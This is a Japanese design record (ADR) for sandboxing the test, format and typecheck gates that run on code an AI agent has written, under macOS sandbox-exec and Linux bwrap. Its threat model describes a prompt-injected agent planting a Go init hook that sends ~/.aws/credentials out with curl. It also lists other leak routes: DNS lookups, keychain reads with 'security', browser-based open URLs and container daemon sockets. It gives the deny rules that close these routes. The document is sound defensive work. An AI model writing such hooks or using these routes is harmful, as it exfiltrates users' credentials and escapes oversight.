# ADR-0013: gate の実行 — OS sandbox、無ければ人の同意の後

- 状態: 採用（2026-10-03、レビュー R1。文言は即時、sandbox は M3）、**改訂 R2（2026-10-04）: gate 自身のループバックは許す（下）** / 関連: SEC-03・SEC-14、ADR-0006 R1、loop spec §7.6、cr-requests/agent.md #8

## Context
gate（formatter・typecheck・test）は agent が書いた diff を人が見る前に実行されていた。prompt injection で agent に `func init(){ … curl -d @$HOME/.aws/credentials … }` を関連 test に書かせれば、`go test` がネットワークと HOME を持ったホスト上でそれを実行する（「Bash を渡さない」L3 と「人が承認する」L7 の両方を迂回）。vitest/jest/pytest の preload、`build.rs`、JS 設定ファイルを読む formatter も同じ。依存 dir の symlink 経由で本物の依存を書き換えられ、reject しても残る。trust ダイアログは「ネットワーク・秘密情報は渡しません」と書いていた（v1 では誤り）。

## Decision
1. **文言（即時）**: trust ダイアログは事実どおり「あなたの権限で実行されます。sandbox が無い環境ではネットワークとホームにアクセスできます。AI が書いたコードがここで実行されます」。
2. **分類**: `GateSpec.executesRepoCode`。`false` は純 formatter の allowlist（gofmt、rustfmt / `cargo fmt`、`ruff format`、black、JSON 設定の biome）だけ。他（test runner、JS/TS 設定の prettier/eslint、typecheck が plugin を読むもの、build）は `true`。
3. **sandbox（M3、`security.gateSandbox: "auto"` 既定）**: macOS は `sandbox-exec`、Linux は `bwrap`（daemon 起動時に検出、`EffectiveSettings.gateSandbox`）。profile: network 拒否（R2: gate が自分で開いたループバックのソケットを除く）、書き込みは worktree・job の TMPDIR・`CARGO_TARGET_DIR` のみ、依存の realpath は読み取り専用、`~/.ssh ~/.aws ~/.config/gh ~/.mitori ~/.claude*` と keychain は読み取りも拒否。
4. **sandbox が無いとき**: `executesRepoCode` の gate は AI の diff に対して `pending_consent`。diff を表示した後に人が「自動検査を実行」（`POST /jobs/:job/gates/run`）を押してから走る。修復ループもその同意を待つ。依存ツリー（symlink 先）の hash を前後で比べ、変化したら job を失敗にする。
5. **remote-readonly**: gate の trust 既定は denied（opt-in のみ）。
6. `security.gateSandbox: "require"` は sandbox が無ければ実行しない、`"off"` は trust 後に sandbox 無しで実行（設定画面で赤字、`EXEC_SETTING_KEYS`）。

## Consequences
- sandbox のある macOS / bwrap 入り Linux では体験が変わらない（gofmt を含むデモは影響なし）。
- sandbox の無い環境では test 系 gate が 1 クリック増える。ReadyCard は `⚠ 検査なし` を正直に表示する（UXP-05）。
- `sandbox-exec` は Apple が非推奨にしている API。使えなくなったら consent 経路だけで出荷する（R1-O2）。評価候補として Anthropic の OSS `@anthropic-ai/sandbox-runtime` を M3 前に比較する。

## Alternatives
- 常に同意を求める: sandbox がある環境では不要な摩擦。
- container（Docker）で実行: 依存の再現と起動時間が重い。インストールを前提にできない。

## 改訂 R2（2026-10-04、rem/safety）: gate は自分のループバックだけを使える

### Context
決定 3 の「network 拒否」はループバックも拒否していた。Go の `httptest.NewServer`、Node の `server.listen(0)`、pytest-httpserver のように、
テストが 127.0.0.1 にサーバーを立てて自分で叩く repo では、そのテストが base でも head でも失敗する（実機 run 4、go-small の `internal/meta`）。
F2 で出荷版が sandbox を使うようになったので、この種のパッケージは常に「検査なし ⚠」になり、修復ターンも動かない（`cr-requests/agent.md` #8）。

### Decision
**gate が開いたソケットには届き、gate を始める前からホストにあったものには何も届かない。** Linux の private network namespace と同じ意味を macOS でも作る。

1. **Linux（bwrap）**: `--unshare-net` のまま（bwrap が新しい名前空間の `lo` を上げる）。127.0.0.1 は gate 専用で、daemon・プロキシ・DB・ブラウザのデバッグポートは別の名前空間にあり届かない。abstract unix socket も名前空間ごとに分かれる。read-only bind では unix socket への connect(2) を止められないので、ホストのために動くデーモンの socket を隠す: `--tmpfs /run/user /run/dbus /run/podman /run/containerd /nix/var/nix/daemon-socket`、`/run/docker.sock`・`/var/run/docker.sock` に `/dev/null` を bind。検出（`detectGateSandbox`）は `--unshare-net` も確かめる。**Linux 実機では未実行**（argv の形だけを unit test で確かめた）。
2. **macOS（sandbox-exec）**: network namespace が無いので、profile で同じ意味を作る。
   - gate を始める直前に、loopback / wildcard に bind 済みの TCP（LISTEN）と UDP のポートを集める（`netstat -an -f inet|inet6` ∪ `lsof -nP -iTCP -sTCP:LISTEN -iUDP`）。
   - `(allow network-bind network-inbound (local ip "localhost:*"))`・`(allow network-outbound (remote ip "localhost:*"))` の**後に**、集めたポートと特権ポート 1–1023（root のデーモンは `lsof` に見えない）と `ftp-proxy`（launchd・root・127.0.0.1:8021）を `(deny network-outbound (remote tcp|udp "localhost:N"))` で拒否する。TCP と UDP は別に拒否する（同じ番号の自分の UDP を巻き込まない）。
   - **fail closed**: 集めた一覧に daemon 自身のポート（`~/.mitori/daemon.json`）が無ければ、一覧は信用できない（下の「見えない」）。その場合と、一覧が取れない場合は、ループバックも従来どおり全部拒否する。
   - daemon の registry・lock・state DB・セッション鍵は `~/.mitori` にあり、従来どおり読み取りも拒否（gate の木だけ再許可）。login nonce は daemon のメモリにしか無い。
3. **同時に閉じた穴（macOS、`(allow default)` の profile が通していたもの）**:
   - unix socket は書き込み可能な dir（木・job TMPDIR・cache）の中だけ。以前は全 unix socket を許していたので、mDNSResponder 経由の **DNS 問い合わせ（外への漏洩路）**、Docker / OrbStack / nix daemon の socket（ネットワーク付きでコンテナや fetch を代行する）に届いた。
   - mach-lookup を拒否: `com.apple.SecurityServer`・`com.apple.securityd.xpc`（keychain の項目を渡す。`~/Library/Keychains` のファイル拒否だけでは `security find-generic-password -w` が通った）、LaunchServices・Apple events（`open https://…?d=<秘密>` でブラウザに運ばせる）、`nsurlsessiond`（代理の通信）、pasteboard。
   - 検出（`detectGateSandbox`）は、これらの構文をすべて含む profile で `sandbox-exec` を試す。どれかが将来 parse できなくなれば `"none"`（同意の経路）に落ちる。

### 確かめたこと（macOS 27、`packages/loop/src/gates/runner.int.test.ts` RT-30b、`sandbox.test.ts`）
- gate の中で Bun のサーバー + fetch、`go test`（`httptest.NewServer` + `http.Get`）が pass。
- 同じ gate から daemon のポート・事前にあったリスナー・192.0.2.1 は `Operation not permitted`、DNS（example.com）は `ENOTFOUND`。sandbox の外からは同じリスナーに届く（拒否は profile による）。
- 一覧に daemon のポートが無い（登録ポートが listen されていない）と、gate 自身のサーバーも立たない（fail closed）。
- 既存の RT-30（`~/.ssh` 読み取り・HOME 書き込み・外部通信の拒否）と INT-08 は緑のまま。node / python の localhost サーバーも手元で pass。

### Trade-offs と残り
- **見えない**: macOS 26 以降、Bun / Node が起動した `netstat`（とその子）にはカーネルがソケットを 1 つも見せない（`sysctl net.inet.tcp.pcblist_n` が空、原因は未特定）。出荷版の daemon は Bun なので、実際には `lsof`（**自分のユーザーのプロセスだけ**）が一覧になる。root が 1024 以上で listen するサービスは見えず、届いてしまう（特権ポートと 8021 は常に拒否）。daemon のポートが一覧に無いことは検出して閉じる。
- **LAN からの着信**: Seatbelt の `(local ip "localhost:*")` は `0.0.0.0` / `::` への bind も許し、accept を相手のアドレスで絞れない。gate が全インターフェースに listen すると、その間は LAN の端末から接続でき、その接続に書き返せる（ポート番号とタイミングを知る LAN 上の相手が要る）。macOS のアプリケーションファイアウォールが有効なら着信は別に問われる。
- **競合**: 一覧は gate の開始時点のもの。gate の実行中に別のプロセスが新しく listen したポートには届く。逆に、v6 だけで使われている番号を gate が v4 で引き当てると、自分のサーバーに届かず失敗する（稀）。
- **費用**: 一覧の取得（並列で lsof ≈ 50–100 ms）と、≈ 2,100 規則の profile の compile（≈ 60 ms）が gate ごとに増える。`go test` などの実行時間に比べて小さい。
- `(allow default)` の profile のままなので、上で名前を挙げていない mach service が代理で何かをする可能性は残る。deny-default の profile か `@anthropic-ai/sandbox-runtime` の比較は Consequences の R1-O2 のとおり。

### 決定 2 の補足（同じパス、F9）
純 formatter の allowlist は「バイナリそのもの」に対して判定する。`node_modules/.bin/biome` は Node の launcher（`BIOME_BINARY` を読んで native を起動する）なので、biome は native build（`node_modules/@biomejs/cli-<os>-<arch>/biome`）を直接実行するときだけ `executesRepoCode: false`。native が見つからなければ launcher を `true` として扱う。`.venv/bin/black` のような `#!` の console script も `true`。repo 内のバイナリは realpath とバイト列の sha256 を trust hash に含めるので、信頼した後の `npm install` / `pip install` で差し替わると再確認になる（`gates/binaries.ts`、CR safe-4）。

### Alternatives（R2）
- (a) 従来どおり全部拒否: 正直だが、loopback を使うテストのあるパッケージは永久に未検証。
- (b) ループバックを全部許可: ローカルのプロキシ（Clash などの 127.0.0.1:7890）経由で外に出られ、daemon・DB・ブラウザの CDP（9222）にも届く。
- (c) (b) + 既知のポートの拒否リスト: 名前を知らないサービスに届く。今回の決定は、(c) の拒否リストを「その時点でホストにあるすべて」にしたもの。
